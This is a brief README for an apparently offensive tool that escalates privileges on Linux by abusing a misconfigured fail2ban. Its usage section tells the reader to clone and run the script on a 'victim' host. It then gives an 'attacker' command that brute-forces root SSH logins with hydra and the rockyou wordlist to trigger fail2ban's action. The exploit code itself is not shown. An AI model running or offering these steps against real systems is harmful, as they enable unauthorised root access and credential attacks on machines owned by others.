
# Privilege Escalation via fail2ban
In Linux, fail2ban is mostly used to protect the SSH service. 
If the daemon detects several unsuccessful ssh login attempts, it executes a command that blocks the IP address.
So misconfigurations can lead to privilege escalation.

![alt text](https://github.com/rvizx/fail2ban/blob/main/image.png?raw=true)

# Usage
```
git clone https://github.com/rvizx/fail2ban
```

@victim
```
chmod +x fail2ban
./fail2ban
```

@attacker
```
hydra <ip-addr> -l root -P /usr/share/wordlists/rockyou.txt ssh
```

# Notes
https://youssef-ichioui.medium.com/abusing-fail2ban-misconfiguration-to-escalate-privileges-on-linux-826ad0cdafb7
